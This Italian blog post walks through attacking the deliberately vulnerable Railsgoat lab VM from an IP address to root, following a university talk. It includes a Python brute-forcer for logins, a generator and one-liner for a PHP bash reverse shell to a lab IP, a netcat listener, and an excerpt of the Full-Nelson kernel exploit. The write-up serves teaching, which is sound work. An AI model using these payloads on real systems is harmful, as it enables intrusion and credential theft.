---
layout: post
title: "Getting Root: Railsgoat"
exercise: https://railsgoat.cktricky.com
level: FACILE
promotion: 
modified: 
featured: false
category: [getting-root]
tags: [walkthrough, oscp, owasp, owasp-bwap, getting-root]
comments: true
image:
  feature: root.png
  credit: 
  creditlink: 
share: true
---

Settimana scorsa ho tenuto un talk all'Università di Parma, presso la facoltà
di ingegneria, dal titolo "Vulnerability Assessment and safe coding in web
applications". Le slide le potete trovare
[qui](https://speakerdeck.com/thesp0nge/vulnerability-assessment-and-secure-coding-in-web-applications).

L'idea, in tre ore di intervento, era di usare [Railsgoat]({{page.exercise}})
ed il progetto [Owasp Broken Web
Application](https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project)
per far vedere come l'enumerazione, il saper cogliere dettagli ed indizi ed un
pizzico di fortuna, ci possono portare da un'applicazione web ad una shell di
root.

Sul più bello, ovvero alla terza ora, quando dovevamo armarci, partire e bucare
[Railsgoat]({{page.exercise}}), il proiettore ha fatto le bizze. Quindi lascio
qui un piccolo walkthrough, dei passi fatti per partire dall'indirizzo IP e
URL, fino ad una shell di root.


## Owasp Broken Web Application Project

Il progetto  [Owasp Broken Web
Application](https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project) è nato con lo scopo di fornire una macchina virtuale, differente dalla solita metasploitable, per permettere a chiunque di esercitarsi con applicazioni volutamente vulnerabili.

[Railsgoat]({{page.exercise}}) è una di queste. Scritta in Ruby on Rails, vuole simulare un portale aziendale dedicato alla gestione del personale. L'amministratore, avrà a disposizione la form di gestione di alcuni dipendenti e, tra le altre cose, sarà possibile fare l'upload delle polizze sanitarie aziendali, gestire i dati dello stipendio e molto altro.

Durante il talk siamo partiti con solo 2 dati a nostra disposizione:

* l'indirizzo IP del server: 172.16.202.241
* il nome dell'applicazione web: Railsgoat

### Setup dell'ambiente

Questa volta avevo entrambe le macchine in esecuzione con VMWare Fusion sotto
Mac OS X. Questo semplicemente perché avevo già pronta la macchina Kali Linux
usata per l'oscp.

L'importante è che mettiate entrambe le macchine in una rete privata e non
siano nattate con il vostro host fisico.

## Enumeration

Come prima cosa, andiamo a vedere quali sono i servizi in ascolto sul mio target:
{%highlight sh%}
# nmap -sV -oA railsgoat 172.16.202.241
...
# cat railsgoat.nmap

# Nmap 7.50 scan initiated Wed Nov 29 18:09:28 2017 as: nmap -sV -oA railsgoat 172.16.202.241
Nmap scan report for 172.16.202.241
Host is up (0.00052s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 5.3p1 Debian 3ubuntu4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.2.14 ((Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.30 with Suhosin-Patch proxy_html/3.0.1 mod_python/3.3.1 Python/2.6.5 mod_ssl/2.2.14 OpenSSL...)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Courier Imapd (released 2008)
443/tcp  open  ssl/https?
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
5001/tcp open  java-rmi    Java RMI
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
8081/tcp open  http        Jetty 6.1.25
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5001-TCP:V=7.50%I=7%D=11/29%Time=5A1EE9DD%P=i686-pc-linux-gnu%r(NUL
SF:L,4,"\xac\xed\0\x05");
MAC Address: 00:0C:29:8F:CA:00 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 29 18:09:59 2017 -- 1 IP address (1 host up) scanned in 31.26 seconds
{%endhighlight%}

Dalle prime informazioni che ho, potrebbe essere una macchina con una
distribuzione Ubuntu di Linux. Apache è in esecuzione con un sacco di moduli
per il supporto di vari linguaggi di programmazione. Difficilmente una macchina
di produzione ci riserverà così tanta soddisfazione.

Mi dedico al web server sulla porta 80, perché essendoci passenger in
esecuzione, sarà lui a servire l'applicazione railsgoat.

{%highlight sh%}
# nikto -host 172.16.202.241
{%endhighlight%}

![nikto running]({{site.url}}/assets/images/getting-root/railsgoat/nikto.png)

Proseguo con dirb, restringendo però il campo alla sola directory /railsgoat. Per esercizio provate ad enumerare tutto il sito; troverete un sacco di indizi per bucare anche le altre applicazioni.

{%highlight sh%}
# dirb http://172.16.202.241/railsgoat
{%endhighlight%}

![dirb running]({{site.url}}/assets/images/getting-root/railsgoat/dirb.png)

Partendo da un indirizzo IP ed una url, /railsgoat, abbiamo i seguenti indizi:
* si tratta di un server Linux, presumibilmente Ubuntu
* ha in esecuzione un server web (sia in HTTP che HTTPS) e un Tomcat sulla porta 8080
* l'applicazione railsgoat è scritta in Ruby, non sappiamo ancora quale framework è stato utilizzato.
* /railsgoat ha un suo meccanismo di login, di registrazione degli utenti e di
  download di file. Questo ci può far sperare che esista anche un meccanismo di
  upload.

## Web assault

Navigando l'url _'/railsgoat'_ possiamo ossrevare che ci viene dato un
messaggio d'errore differente a seconda che si stia provando uno username non
esistente o che si stia sbagliando solamente la password.

![a detailed error message, leading to user enumeration]({{site.url}}/assets/images/getting-root/railsgoat/incorrect_pwd_message.png)

Questo ci permette di provare un attacco a forza bruta per enumerare sia gli
username esistenti e poi provare ad enumerare le password.

Per prima cosa, mi credo un dizionario custom per questa attività, usando il
comando _cewl_. _cewl_ permette infatti di, partendo dal contenuto di un sito,
costruire un file di testo da utilizzare come primo dizionario, magari sperando
in qualche password di default contestualizzata alla realtà che stiamo
attaccando.

{%highlight sh%}
# cewl http://172.16.202.241/ -w foo
{%endhighlight%}

Poi, invece di usare hydra o lo stesso intruder di Burp, per motivi puramente
didattici (e perché mi divertiva l'idea) ho buttato giù due linee di python.
poster.py è uno script che, letto un dizionario in ingresso, permette, a
seconda di come viene invocato, di fare il bruteforce di utenti o di password
della url passata come argomento.

_cheater note:_ admin1234 non sarebbe stato incluso nel dizionario e non avevo
tempo di implementare nello script, una funzione di permutazione delle parole
trovate con l'aggiunta di numeri. Mi serviva per far vedere cewl durante il
talk. L'aggiunta della funzionalità in poster.py è abbastanza semplice.

{%highlight python%}
#!/usr/bin/env python

import requests
import sys, getopt

def brute_username(url, wordlist, domain):
    print '[+] bruteforcing usernames appending ' + domain + ' as domain'

    lines = [line.rstrip('\n') for line in open(wordlist)]
    for l in lines:
        r = requests.post(url, data={'email':l+'@'+domain, 'password':'a very complex password', 'commit':'Login'})
        #if l+'@'+domain+' doesn' in r.text:
            # print 'yeah'
        if 'Incorrect Password!' in r.text:
            print l

def brute_password(url, wordlist, domain, username):
    print '[+] bruteforcing password for ' + username +'@'+domain
    lines = [line.rstrip('\n') for line in open(wordlist)]

    for l in lines:
        r = requests.post(url, data={'email':username+'@'+domain, 'password':l, 'commit':'Login'})
        if "Welcome, Admin" in r.text:
            print username + '@' + domain + ':' + l
            sys.exit(0)



def main(argv):

    url = ''
    wordlist = ''
    brutelogin = None
    brutepassword = None
    domain = ''
    username = ''

    try:
        opts, args=getopt.getopt(argv, "hu:w:LPd:U:", ["url=","wordlist=", "domain=", "username="])
    except getopt.GetoptError:
        print 'poster.py -u <url> -w <wordlist file> -d <account domain> [-L|-P]'
        sys.exit(-2)

    for opt, arg in opts:
        if opt == '-h':
            print 'poster.py -u <url> -w <wordlist file>  -d <account domain> -U <username to use>[-L|-P]'
            print '\n\t-L: brute login name using the given wordlist'
            print '\n\t-P: brute passwords using the given wordlist'
            sys.exit(1)
        elif opt in ("-u", "--url"):
            url = arg
        elif opt in ("-w", "--wordlist"):
            wordlist = arg
        elif opt == '-L':
            brutelogin = True
        elif opt == '-P':
            brutepassword = True
        elif opt in ("-d", "--domain"):
            domain = arg
        elif opt in ("-U", "--username"):
            username = arg

    print '[+] poster.py (c) 2017 paolo@codiceinsicuro.it'
    print '[+] attack ' + url + ' using ' + wordlist + ' as wordlist'

    if brutelogin and brutepassword:
        print '[-] please choose only one between -L and -P'
        sys.exit(-3)

    if brutelogin: 
        brute_username(url, wordlist, domain)
    if brutepassword:
        brute_password(url, wordlist, domain, username)

if __name__ == "__main__":
    main(sys.argv[1:])

{%endhighlight%}

Lancio poster.py per enumerare gli username di /railsgoat:

{%highlight sh%}
# python poster.py -u http://172.16.202.241/railsgoat/sessions -w foo -L -d metacorp.com
{%endhighlight%}

![username enumeration]({{site.url}}/assets/images/getting-root/railsgoat/username_enumeration.png)

Ora lancio poster.py per enumerare la password di admin@metacorp.com
{%highlight sh%}
# python poster.py -u http://172.16.202.241/railsgoat/sessions -w foo -P --username admin -d metacorp.com
{%endhighlight%}

![password enumeration]({{site.url}}/assets/images/getting-root/railsgoat/password_enumeration.png)

Ed ecco qui, _admin1234_ è la password di admin@metacorp.com

## Uploading the bomb

Navigando come utente _admin_ non riusciamo ad arrivare alla url /download.
Quello che però possiamo fare, invece di _investire_ tempo in altri bruteforce,
è registrare un nuovo utente.

Registrati come utente _tre@metacorp.com_, possiamo navigare la directory
/download che ci redirige su
http://172.16.202.241/railsgoat/users/8/benefit_forms. L'8 è l'id del nostro
utente e, sì, ci sono tanti problemi di insecure direct object reference.

![nuovo utente]({{site.url}}/assets/images/getting-root/railsgoat/upload_form.png)

Per l'oscp, mi sono scritto uno scriptino python che mi genera il codice PHP
per fare una reverse shell con la funzione exec().

{%highlight python%}
#!/usr/bin/env python

import sys, getopt

def main(argv):
    host = ''
    port = ''

    try:
        opts, args=getopt.getopt(argv, "hH:P:", ["help","host=", "port="])
    except getopt.GetoptError:
        print sys.argv[0] + ' -H <host> -P <port>'
        sys.exit(-2)
    
    for opt, arg in opts:
        if opt in ('-h', '--help'):
            print sys.argv[0]+ ' - create reverse shell oneliner'
            print sys.argv[0]+ ' -H <host> -P <port> '
            sys.exit(1)
        if opt in ('-H', '--host'):
            host = arg
        if opt in ('-P', '--port'):
            port = arg

    if host == '' or port == '':
        print sys.argv[0] + ' -H <host> -P <port>'
        sys.exit(-1)
    print "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+host+"/"+port+" 0>&1'\");"
    return 0
 
    
if __name__ == "__main__":
    main(sys.argv[1:])

{%endhighlight%}

Eseguendo questo script, mi genero il codice PHP per eseguire bash e creare una
reverse shell. Scelgo PHP, perché, tra le mille informazioni, ho visto che
Apache ha il modulo per questo linguaggio in esecuzione, quindi,
presumibilmente, eseguirà questo script.

{%highlight php%}
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/172.16.202.147/31337 0>&1'");
{%endhighlight%}

![oneliner]({{site.url}}/assets/images/getting-root/railsgoat/create_oneliner.png)

Dalla form di upload della polizza sanitaria della Metacorp, scelgo il file PHP
che ho appena generato e metto netcat in ascolto sulla porta 31337 con il
comando:

{%highlight sh%}
# nc -lvnp 31337
{%endhighlight%}

Navigando l'url http://172.16.202.241/railsgoat/data/rs.php, invoco lo script e
la mia shell non privilegiata viene aperta sulla macchina.

![unpriv shell]({{site.url}}/assets/images/getting-root/railsgoat/unpriv_shell.png)

## Let's root

Da dentro la macchina è più facile prendere tutte le informazioni che ci
servono per prendere il controllo della macchina. In particolare, la versione
del kernel e del sistema operativo, con la quale andremo alla ricerca di
exploits.

![system info]({{site.url}}/assets/images/getting-root/railsgoat/sysinfo.png)

Questa la lista di exploit dalla quale possiamo partire:

![exploits]({{site.url}}/assets/images/getting-root/railsgoat/exploits.png)

E la scelta cade su Full-Nelson.c privilege escalation.

Questo exploit, sfrutta la bellezza di tre vulnerabilità distinte per darci una shell di root:
* [CVE-2010-4258](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4258)
* [CVE-2010-3849](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3849)
* [CVE-2010-3850](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3850)

La CVE-2010-3850 è relativa alla mancanza di controlli sull'assegnazione di un
indirizzo Econet ad interfacce arbitrarie mentre la CVE-2010-3849 è una NULL
pointer dereference nel procollo Econet.

Nell'exploit, le due vulnerabilità sono realizzate in questa routine che causa
un OOPS e permette al programma chiamante di fruttare la CVE-2010-4258 che mi
permette di scrivere NULL in porzioni arbitrari del kernel, quando un OOPS si
verifica durante una clone(2).

In particolare attraverso commit_creds e prepare_kernel_cred faremo in modo dai
dare EUID 0 al nostro processo in esecuzione.

{%highlight c%}
/* Triggers a NULL pointer dereference in econet_sendmsg
 * via sock_no_sendpage, so it's under KERNEL_DS */
int trigger(int * fildes)
{
        int ret;
        struct ifreq ifr;

        memset(&ifr, 0, sizeof(ifr));
        strncpy(ifr.ifr_name, "eth0", IFNAMSIZ);

        ret = ioctl(fildes[2], SIOCSIFADDR, &ifr);

        if(ret < 0) {
                printf("[*] Failed to set Econet address.\n");
                return -1;
        }

        splice(fildes[3], NULL, fildes[1], NULL, 128, 0);
        splice(fildes[0], NULL, fildes[2], NULL, 128, 0);

        /* Shouldn't get here... */
        exit(0);
}
{%endhighlight%}

Tralasciando questa spiegazione superficiale e non accurata, trasferiamo il
nostro exploit sulla macchina di railsgoat. Possiamo usare wget, basterà
copiare il nostro file in /var/www/html sulla nostra Kali Linux ed avviare il
servizio apache.

Una volta trasferito sulla macchina, lo possiamo compilare, grazie alla
presenza del gcc a bordo ed, eseguendo l'attacco, siamo root sulla macchina.

![root dance]({{site.url}}/assets/images/getting-root/railsgoat/root_dance_with_full_nelson.png)

## Off by one

Ringrazio l'Università di Parma, ma soprattutto Danilo e l'Unione degli
Universitari di Parma, per avermi invitato a tenere un talk e aver sopportato
le bizze del proiettore nell'ultima ora. 

Come promesso, ho ripercorso con questo post, quello che vi avrei mostrato
successivamente. Spero vi sia piaciuto e se ci sono domande o dubbi, lasciatele
qui nei commenti e vi risponderò.

\#tryharder
